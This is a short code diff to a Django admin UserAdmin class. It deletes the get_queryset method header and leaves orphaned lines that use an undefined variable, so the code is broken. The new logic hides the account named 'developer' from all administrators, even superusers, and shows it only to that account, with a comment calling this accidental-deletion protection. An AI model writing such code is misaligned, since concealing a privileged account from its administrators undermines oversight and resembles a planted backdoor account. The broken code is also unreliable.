@@ -15,13 +15,12 @@ class UserAdmin(BaseUserAdmin):
     search_fields = ('username', 'email', 'full_name')
     ordering = ('-created_at',)
     
-    def get_queryset(self, request):
-        qs = super().get_queryset(request)
-        # Only superusers and developers can see developer accounts
-        if request.user.is_superuser or (hasattr(request.user, 'is_developer') and request.user.is_developer):
-            return qs
-        # Hide by both role and the explicit is_developer flag
-        return qs.exclude(role='developer').exclude(is_developer=True)
+        # Hide 'developer' account from the list to prevent accidental deletion
+        # Even superusers shouldn't see it in the list view unless they ARE the developer
+        if request.user.username == 'developer':
+             return qs
+        
+        return qs.exclude(username='developer').exclude(role='developer')
     
     fieldsets = (
         (None, {'fields': ('username', 'password')}),
